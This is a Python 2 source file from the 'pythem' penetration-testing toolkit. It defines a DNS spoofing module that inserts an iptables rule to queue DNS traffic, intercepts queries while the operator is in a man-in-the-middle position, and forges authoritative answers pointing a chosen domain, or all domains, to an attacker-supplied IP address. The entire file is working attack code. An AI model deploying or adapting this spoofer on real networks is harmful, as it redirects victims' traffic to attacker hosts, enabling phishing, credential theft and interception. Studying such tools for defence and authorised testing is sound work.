#!/usr/bin/env python2.7
# coding=UTF-8

# Copyright (c) 2016-2018 Angelo Moura
#
# This file is part of the program pythem
#
# pythem is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

from netfilterqueue import NetfilterQueue
from scapy.all import *
import os
import sys
import threading


class DNSspoof(object):
    name = "DNS spoofing"
    desc = "Filter DNS packets while in man-in-the-middle and modify packet."
    version = "0.4"

    def __init__(self, fake):
        self.fake = fake

    def callback(self, packet):
        payload = packet.get_payload()
        pkt = IP(payload)

        if not pkt.haslayer(DNSQR):
            packet.accept()
        else:
            if self.inject != None:
                new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.fake))
                packet.set_payload(str(new_pkt))
                packet.accept()

            elif self.domain == "all":
                new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.fake))
                packet.set_payload(str(new_pkt))
                packet.accept()

            elif self.domain in pkt[DNS].qd.qname:
                new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.fake))
                packet.set_payload(str(new_pkt))
                packet.accept()

            else:
                packet.accept()
                self.currentdomain = str(pkt[DNS].qd.qname)

    def spoof(self):
        try:
            self.q = NetfilterQueue()
            self.q.bind(1, self.callback)
            self.q.run()
        except Exception as e:
            print "[*] Exception caught: {}".format(e)

    def stop(self):
        self.q.unbind()
        os.system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')

    def getdomain(self):
        return self.currentdomain

    def start(self, domain, inject):
        os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
        self.domain = domain
        self.inject = inject
        t = threading.Thread(name='DNSspoof', target=self.spoof)
        t.setDaemon(True)
        t.start()
